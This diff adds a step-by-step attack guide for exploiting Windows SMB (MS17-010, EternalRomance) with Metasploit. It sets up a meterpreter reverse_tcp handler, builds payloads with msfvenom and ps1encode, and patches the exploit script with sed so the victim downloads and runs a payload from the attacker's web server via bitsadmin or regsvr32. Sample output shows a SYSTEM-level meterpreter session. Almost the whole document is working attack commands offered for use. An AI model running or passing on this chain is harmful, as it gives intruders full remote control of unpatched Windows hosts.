@@ -1,0 +1,49 @@
+#1. – Test Target IP first to see if exploitable
+msfconsole
+use auxiliary/scanner/smb/pipe_auditor
+set RHOSTS [TargetIP]
+exploit
+ 
+*choose any pipe name ‘netlogon’, ‘spoolss’, ‘browser’ etc…
+ 
+#2 – Create Metasploit Handler
+IP=`ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'`
+msfconsole -qx "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST '$IP';set ExitOnSession false;exploit -j -z"
+ 
+ 
+ 
+#3. – Grab Exploit Scripts in console 2
+wget https://www.exploit-db.com/download/42315-O EternalRomance.py
+wget https://github.com/worawit/MS17-010/raw/master/mysmb.py
+ 
+ 
+ 
+#4a. – Payload Choice #1 – Create EXE payload using bitsadmin dl and execute
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP -f exe-service > /var/www/html/1.exe
+IP=`ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'`
+sed -i -e "s/USERNAME = ''/USERNAME = 'GUEST'/g" -e 's/#service_exec(conn, r'\''cmd \/c copy c:\\pwned.txt c:\\pwned_exec.txt'\'')/service_exec(conn, r'\''cmd \/c bitsadmin \/transfer wcb \/priority high http:\/\/'$IP'\/1.exe C:\\1.exe \&\& C:\\1.exe'\'')/g' EternalRomance.py
+ 
+ 
+ 
+#4b. – Payload Choice #2 – Create SCT payload with regsvr32 dl with scrobj.dll
+git clone https://github.com/CroweCybersecurity/ps1encode .
+IP=`ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'`
+echo $IP | ruby ps1encode.rb --PAYLOAD windows/meterpreter/reverse_tcp --LHOST='puts ARGF.read' --LPORT=4444 -t sct
+chmod +x ./index.sct && mv ./index.sct /var/www/html/1.sct
+sed -i -e "s/USERNAME = ''/USERNAME = 'GUEST'/g" -e 's/#service_exec(conn, r'\''cmd \/c copy c:\\pwned.txt c:\\pwned_exec.txt'\'')/service_exec(conn, r'\''regsvr32 \/s \/n \/u \/i:http:\/\/'$IP'\/1.sct scrobj.dll'\'')/g' EternalRomance.py
+ 
+Credits for this regsvr32 payload idea:Sheila Berta / Casey Smith / CroweCybersecurity
+#5. – Start Webserver
+service apache2 start
+ 
+##################################
+# Exploit it(change the TargetIP and named pipe if you want)
+python EternalRomance.py [TargetIP] netlogon
+ 
+If all goes well a shell shall rain down on ya.
+[*] Sending stage (957487 bytes) to 192.168.128.19
+[*] Meterpreter session 1 opened (192.168.128.17:4444 -> 192.168.128.19:49176) at 2017-09-30 05:08:42 -0400
+msf exploit(handler) > sessions -i 1
+[*] Starting interaction with 1…
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
